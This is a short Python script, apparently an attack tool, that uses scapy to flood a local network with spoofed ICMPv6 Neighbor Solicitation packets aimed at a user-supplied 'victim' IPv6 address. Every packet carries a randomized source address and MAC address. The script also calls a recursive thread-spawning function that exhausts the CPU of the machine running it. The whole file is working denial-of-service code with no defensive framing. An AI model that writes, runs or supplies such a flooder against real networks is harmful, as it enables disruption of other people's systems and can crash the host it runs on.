#!/usr/bin/python
import random
import sys
from threading import Thread
from scapy.layers.inet6 import IPv6, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr
from scapy.sendrecv import srflood, send

# Ask user to insert value
if len(sys.argv) == 2:
    victim_ip = sys.argv[1]
else:
    print("Please insert:\n 1. Victim's IPv6")
    sys.exit(1)


# Stress the CPU
def CPU():
    Thread(target=CPU).start()
    CPU()

print("Flooding the network with NS messages.")
# Generate packets
while True:
    base = IPv6()
    base.dst = "ff02::1"
    M = 16 ** 4
    base.src = "fe80::dead:" + ":".join(("%x" % random.randint(0, M)
                                         for j in range(4)))
    random_mac = "02:03:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                              random.randint(0, 255),
                                              random.randint(0, 255))
    packet = base / ICMPv6ND_NS(tgt=victim_ip) / \
             ICMPv6NDOptSrcLLAddr(lladdr=random_mac)
    send(packet, verbose=False)
    CPU()
